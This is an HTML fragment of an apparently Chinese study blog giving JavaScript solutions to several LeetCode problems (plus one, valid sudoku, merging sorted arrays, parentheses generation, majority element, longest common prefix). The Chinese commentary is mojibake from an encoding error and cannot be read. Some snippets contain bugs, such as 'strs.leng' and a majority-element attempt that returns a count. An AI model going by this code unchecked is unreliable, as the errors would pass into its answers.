class="headerlink" title="LeetCode66â€”â€”åŠ ä¸€ï¼ˆâ˜†ï¼‰"></a>LeetCode66â€”â€”åŠ ä¸€ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/plus-one/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -18"><a href="#è‡ªå·±çš„ä»£ç -18" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plusOne = <span class="function"><span class="keyword">function</span> (<span class="params">digits</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">parseInt</span>(digits.join(<span class="string">&quot;&quot;</span>))+<span class="number">1</span>+<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    digits[i] = <span class="built_in">parseInt</span>(s[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> digits</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡æƒ³åˆ°çœ‹èµ·æ¥è¿™ä¹ˆç®€å•çš„ä¸€é“é¢˜ç›®ï¼Œè¢«å¡æ­»äº†ã€‚ã€‚çœ‹åˆ°é¢˜ç›®ç¬¬ä¸€çœ¼å°±æ˜¯ç›´æ¥å¯¹æ•°ç»„æœ€åä¸€ä½+1ï¼Œä½†æ˜¯æ²¡è€ƒè™‘åˆ°9ã€‚ç„¶ååˆæƒ³åˆ¤æ–­æ˜¯å¦ä¸º9ï¼Œå¯¹å‰ä¸€ä½+1ï¼Œä½†å­˜åœ¨ä¸ªä½æ•°ï¼Œæ²¡æœ‰indexä¸º-1çš„æƒ…å†µã€‚</p><p>ç„¶åæ¢äº†ç§æ–¹æ³•ï¼Œæ•°ç»„å…ˆå˜å­—ç¬¦ä¸²å†å˜æ•°å­—+1ï¼Œå†å˜å­—ç¬¦ä¸²ï¼Œæ‹†åˆ†ä¸ºæ•°ç»„ï¼Œæœ€åå¾—åˆ°æ•°å­—æ•°ç»„ï¼Œä½†æ˜¯parseIntæœ‰æœ€å¤§é™åˆ¶ï¼Œç”¨Floatä¹Ÿä¸è¡Œã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-10"><a href="#æ€è·¯-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>æ€»ç»“ä¸€ä¸‹å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ï¼š</p><ol><li>å½“å‰ä½æ˜¯å¦éœ€è¦è¿›ä½ï¼Ÿ</li><li>æ•°å­—é•¿åº¦æ˜¯å¦ä¼šæ”¹å˜ï¼Ÿ</li></ol><p><del>ï¼ˆä¸ºå•¥è¿™ä¹ˆå¿«å°±èƒ½æŠ“ä½é¢˜ç›®ç²¾é«“å•Šï¼‰</del></p><p>æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>é¦–å…ˆå°†æ•°å­—è½¬ä¸ºæ•°ç»„å½¢å¼ï¼Œä¾¿äºæ•°æ®å¤„ç†ã€‚</li><li>æ•°ç»„æœ«ä½æ•°å­—åŠ  11ï¼Œç„¶åå¼€å§‹å€’åºéå†æ•°ç»„ã€‚</li><li>åˆ¤æ–­å½“å‰ä½æ•°å­—æ˜¯å¦éœ€è¦è¿›ä½ï¼Œåšå‡ºå¯¹åº”å¤„ç†ã€‚</li><li>éå†æ•°ç»„å®Œæ¯•ï¼Œè‹¥è¿˜å­˜åœ¨è¿›ä½ï¼Œåˆ™æ•°ç»„é¦–ä½æ·»åŠ  11 å³å¯ã€‚</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plusOne = <span class="function"><span class="keyword">function</span>(<span class="params">digits</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line">    digits[digits.length-<span class="number">1</span>] ++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(flag) digits[i]++;</span><br><span class="line">        flag = digits[i] &gt; <span class="number">9</span>;</span><br><span class="line">        digits[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag) digits.unshift(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> digits;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//ä¸‹é¢çš„æ–¹æ³•å…¶å®ä¹Ÿä¸€æ ·</span></span><br><span class="line"><span class="keyword">var</span> plusOne = <span class="function"><span class="keyword">function</span>(<span class="params">digits</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        digits[i]++</span><br><span class="line">        digits[i] = digits[i] % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> (digits[i]) <span class="keyword">return</span> digits</span><br><span class="line">    &#125;</span><br><span class="line">    digits.unshift(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> digits</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode36â€”â€”æœ‰æ•ˆçš„æ•°ç‹¬ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode36â€”â€”æœ‰æ•ˆçš„æ•°ç‹¬ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode36â€”â€”æœ‰æ•ˆçš„æ•°ç‹¬ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode36â€”â€”æœ‰æ•ˆçš„æ•°ç‹¬ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/valid-sudoku/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -19"><a href="#è‡ªå·±çš„ä»£ç -19" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><p>å®Œå…¨æ²¡æ³•åšè¿™é“é¢˜ç›®ï¼Œè¿™æ˜¯å•¥å•Šï¼Ÿæ„Ÿè§‰ç¬¦åˆè§„åˆ™1ã€2å°±å·²ç»å¥½éº»çƒ¦äº†ï¼Œä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-7"><a href="#æ€è·¯1-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>åˆ©ç”¨mapçš„hasæ¥åˆ¤æ–­ã€‚å…ˆæŠŠæ¨ªç«–éªŒäº†ï¼Œå†éªŒå—çŠ¶ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidSudoku = <span class="function"><span class="keyword">function</span>(<span class="params">board</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> mapRow = <span class="keyword">new</span> <span class="built_in">Map</span>(), mapColumn = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)&#123;</span><br><span class="line">    mapRow.clear();</span><br><span class="line">    mapColumn.clear();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (mapRow.has(board[i][j])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (mapColumn.has(board[j][i])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (board[i][j] !== <span class="string">&quot;.&quot;</span>) &#123; mapRow.set(board[i][j], j) &#125;</span><br><span class="line">      <span class="keyword">if</span> (board[j][i] !== <span class="string">&quot;.&quot;</span>) &#123; mapColumn.set(board[j][i], i) &#125; <span class="comment">// setåé¢çš„iã€jåªæ˜¯å€¼ï¼Œç”šè‡³å¯ä»¥å¸¸é‡</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">let</span> m = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (m &lt; <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (n &lt; <span class="number">9</span>) &#123;</span><br><span class="line">      map.clear();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = n; i &lt; n + <span class="number">3</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = m; j &lt; m + <span class="number">3</span>; j++)&#123;</span><br><span class="line">          <span class="keyword">if</span> (map.has(board[i][j])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">if</span>(board[i][j]!==<span class="string">&quot;.&quot;</span>)&#123; map.set(board[i][j],i) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      n+=<span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    m+=<span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-14"><a href="#å¤æ‚åº¦åˆ†æ-14" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(n)</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£-8"><a href="#æ€è·¯2-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>ç”¨ Set æ›´æ–¹ä¾¿äº›ã€‚ï¼ˆæ³¨æ„é¢˜ç›®åªè¦æ±‚å¯¹å·²æœ‰æ•°å­—è¿›è¡ŒéªŒè¯ï¼ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidSudoku = <span class="function"><span class="keyword">function</span>(<span class="params">board</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> row = <span class="keyword">new</span> <span class="built_in">Set</span>(),</span><br><span class="line">        col = <span class="keyword">new</span> <span class="built_in">Set</span>(),</span><br><span class="line">        box = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">let</span> _row = board[i][j];</span><br><span class="line">      <span class="keyword">let</span> _col = board[j][i];</span><br><span class="line">      <span class="comment">// ä½¿ç”¨ iã€j å¯¹3*3çš„æ¡†è¿›è¡Œè¿­ä»£</span></span><br><span class="line">      <span class="keyword">let</span> _box = board[<span class="number">3</span>*<span class="built_in">Math</span>.floor(i/<span class="number">3</span>)+<span class="built_in">Math</span>.floor(j/<span class="number">3</span>)][<span class="number">3</span>*(i%<span class="number">3</span>)+(j%<span class="number">3</span>)]</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (_row != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (row.has(_row)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        row.add(_row);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (_col != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (col.has(_col)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        col.add(_col);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (_box != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (box.has(_box)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        box.add(_box);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode88â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰"><a href="#LeetCode88â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode88â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰"></a>LeetCode88â€”â€”åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„ï¼ˆâ˜†ï¼‰</h2><p>è·³è½¬åœ°å€</p><h3 id="è‡ªå·±çš„ä»£ç -20"><a href="#è‡ªå·±çš„ä»£ç -20" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">nums1, m, nums2, n</span>) </span>&#123;</span><br><span class="line">  nums1.splice(m, n, ...nums2);</span><br><span class="line">  nums1.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¥—ç”¨ api è¿˜æ˜¯æŒºå®¹æ˜“å®ç°çš„ã€‚ä½†æ˜¯æ—¶é—´å¤æ‚åº¦ä¸ºO(nlogn) ï¼ˆn=&gt;m+nï¼‰</p><h3 id="æ€è·¯-amp-é¢˜è§£-11"><a href="#æ€è·¯-amp-é¢˜è§£-11" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åœ¨ nums1 åé¢ä¸æ–­æ’å…¥å½“å‰æœ€å¤§å€¼ï¼Œç›´åˆ° nums2 ä¸ºç©ºã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">nums1, m, nums2, n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> insertPos = m + n - <span class="number">1</span>;</span><br><span class="line">  m--, n--;</span><br><span class="line">  <span class="keyword">while</span> (n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    nums1[insertPos--] = nums1[m] &gt; nums2[n] ? nums1[m--] : nums2[n--];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-15"><a href="#å¤æ‚åº¦åˆ†æ-15" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><p>æ—¶é—´å¤æ‚åº¦ï¼šOï¼ˆnï¼‰</p><h2 id="LeetCode22â€”â€”æ‹¬å·ç”Ÿæˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode22â€”â€”æ‹¬å·ç”Ÿæˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode22â€”â€”æ‹¬å·ç”Ÿæˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode22â€”â€”æ‹¬å·ç”Ÿæˆï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/generate-parentheses/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -21"><a href="#è‡ªå·±çš„ä»£ç -21" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> generateParenthesis = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">let</span> generate = <span class="function"><span class="keyword">function</span> (<span class="params">left, right, n, str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 1.ç»ˆæ­¢æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (left === n &amp;&amp; right === n) &#123;</span><br><span class="line">      res.push(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.å•å±‚é€»è¾‘ ä¸¤ä¸ª if å°±æ˜¯å‰ªæ</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; n) generate(left + <span class="number">1</span>, right, n, str + <span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (left &gt; right) generate(left, right+<span class="number">1</span>, n, str + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  generate(<span class="number">0</span>, <span class="number">0</span>, n, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ACï¼Œé€’å½’å®ç°ã€‚</p><h2 id="LeetCode169â€”â€”å¤šæ•°å…ƒç´ ï¼ˆâ˜†ï¼‰"><a href="#LeetCode169â€”â€”å¤šæ•°å…ƒç´ ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode169â€”â€”å¤šæ•°å…ƒç´ ï¼ˆâ˜†ï¼‰"></a>LeetCode169â€”â€”å¤šæ•°å…ƒç´ ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/majority-element/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -22"><a href="#è‡ªå·±çš„ä»£ç -22" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> majorityElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> map = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (map[nums[i]]) &#123;</span><br><span class="line">map[nums[i]]++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">map[nums[i]] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">in</span> map) &#123;</span><br><span class="line"><span class="keyword">if</span> (map[c] &gt; nums.length / <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> map[c];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ACï¼Œä½†æ˜¯å¾ˆè‡ƒè‚¿</p><h3 id="æ€è·¯1-amp-é¢˜è§£-8"><a href="#æ€è·¯1-amp-é¢˜è§£-8" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> majorityElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="comment">// å­¦ä¹ ï¼</span></span><br><span class="line">        obj[nums[i]] = obj[nums[i]] + <span class="number">1</span> || <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(obj[nums[i]] &gt; nums.length / <span class="number">2</span>)  <span class="keyword">return</span> nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å®Œå…¨å¯ä»¥ç®€åŒ–å¦‚ä¸Šæ‰€ç¤ºã€‚</p><h3 id="æ€è·¯2-amp-é¢˜è§£-9"><a href="#æ€è·¯2-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>æ’åºã€‚å› ä¸ºå¤§äºä¸€åŠ, æ‰€ä»¥æ’åºåçš„ä¸­é—´é‚£ä¸ªæ•°å³æ˜¯ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> majorityElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  nums.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> a - b)</span><br><span class="line">  <span class="keyword">return</span> nums[<span class="built_in">Math</span>.floor(nums.length / <span class="number">2</span>)]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h1><h2 id="å­—ç¬¦ä¸²ç®€ä»‹"><a href="#å­—ç¬¦ä¸²ç®€ä»‹" class="headerlink" title="å­—ç¬¦ä¸²ç®€ä»‹"></a>å­—ç¬¦ä¸²ç®€ä»‹</h2><p>1.å­—ç¬¦ä¸²çš„åŸºæœ¬æ“ä½œå¯¹è±¡é€šå¸¸æ˜¯<strong>å­—ç¬¦ä¸²æ•´ä½“æˆ–è€…å…¶å­ä¸²</strong>ã€‚ä¾‹å¦‚ï¼Œä¸€å¥è¯ä¸­æ¯ä¸ªå•è¯å°±å«åšå­—ç¬¦ä¸²çš„ã€Œå­ä¸²ã€</p><p>2.å­—ç¬¦ä¸²æ“ä½œæ¯”å…¶ä»–æ•°æ®ç±»å‹æ›´å¤æ‚ï¼ˆä¾‹å¦‚æ¯”è¾ƒã€è¿æ¥æ“ä½œï¼‰</p><h2 id="LeetCode14â€”â€”æœ€é•¿å…¬å…±å‰ç¼€ï¼ˆâ˜†ï¼‰"><a href="#LeetCode14â€”â€”æœ€é•¿å…¬å…±å‰ç¼€ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode14â€”â€”æœ€é•¿å…¬å…±å‰ç¼€ï¼ˆâ˜†ï¼‰"></a>LeetCode14â€”â€”æœ€é•¿å…¬å…±å‰ç¼€ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/longest-common-prefix/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -23"><a href="#è‡ªå·±çš„ä»£ç -23" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> n = strs.length;</span><br><span class="line"><span class="keyword">var</span> count </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;strs[<span class="number">0</span>].length; i++)&#123;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  a = strs[<span class="number">0</span>][i];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs[j].indexOf(a) == i) &#123;</span><br><span class="line">      count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count==n-<span class="number">1</span>) &#123;</span><br><span class="line">    str1 = str1 + a</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (str1 == <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> str1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœŸçš„åˆè‡­åˆé•¿å•Šã€‚è¿˜è¿‡ä¸äº†ï¼Œç¡¬ç½—åˆ—æ€»ä¼šæœ‰è€ƒè™‘ä¸åˆ°çš„åœ°æ–¹ã€‚ä¸ºä»€ä¹ˆåšé¢˜è€æ˜¯æƒ³ä¸åˆ°ç”¨ä¸€äº›<strong>jså†…ç½®æ–¹æ³•</strong>è§£å†³å‘¢ã€‚ï¼ˆæ¯”å¦‚è¿™é¢˜çš„substrï¼‰</p><p>easyé¢˜å¡äº†åŠä¸ªå¤šå°æ—¶å“‡ã€‚ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-9"><a href="#æ€è·¯1-amp-é¢˜è§£-9" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>æš´åŠ›æ±‚è§£ï¼šå…ˆå¯¹æ•°ç»„æ’åºï¼Œçœ‹æœ€å°é•¿åº¦çš„å­—ç¬¦ä¸²æœ‰æ²¡æœ‰åœ¨å…¶ä»–ä¸¤ä¸ªä¸­ï¼Œæ²¡æœ‰çš„è¯å°±å‡å°‘ä¸€ä½ã€‚ä½†æ˜¯å¤æ‚åº¦å¾ˆé«˜ã€‚</p><h3 id="æ€è·¯2-amp-é¢˜è§£-10"><a href="#æ€è·¯2-amp-é¢˜è§£-10" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestCommonPrefix = <span class="function"><span class="keyword">function</span>(<span class="params">strs</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs === <span class="literal">null</span> || strs.leng === <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].length; i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> c = strs[<span class="number">0</span>].charAt(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; strs.length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (strs[j].charAt(i) !== c) &#123;</span><br><span class="line">                <span class="keyword">return</span> strs[<span class="number">0</span>].substr(<span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æˆ–è€…ç›´æ¥ for of</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> s <span class="keyword">of</span> strs) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] !== strs[<span class="number">0</span>][i]) <span class="keyword">return</span> s.slice(<span class="number">0</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> strs[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å­—ç¬¦ä¸²ä¸‹æ ‡çš„æ–¹æ³•æŒ‰ä½æ¯”è¾ƒå•Šï¼ä¸ºå•¥è¦æŠŠå­—ç¬¦ä¸²çš„ç¬¬xä½å–å‡ºæ¥ç„¶åå’Œä¸‹ä¸€ä¸ªçš„ç¬¬xä½æ¯”è¾ƒå‘¢ï¼Ÿ</p><p>è¿˜æœ‰ï¼Œå¯ä»¥å…ˆä¸¤ä¸¤æ¯”è¾ƒï¼Œå†åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ä¸­ä¸¤ä¸¤æ¯”è¾ƒï¼Œä¸ç”¨ä¸€æ¬¡æ€§å¯¹å¾ªç¯ä¸­çš„æ‰€æœ‰å­—ç¬¦ä¸²åˆ¤æ–­å•Šã€‚</p><h3 id="å¤æ‚åº¦åˆ†æ-16"><a href="#å¤æ‚åº¦åˆ†æ-16" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œn ä¸ºæ‰€æœ‰å­—ç¬¦ä¸²çš„é•¿åº¦ä¹‹å’Œ</li></ul><h2 id="LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode5â€”â€”æœ€é•¿å›æ–‡å­ä¸²ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -24"><a href="#è‡ªå·±çš„ä»£ç -24" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç 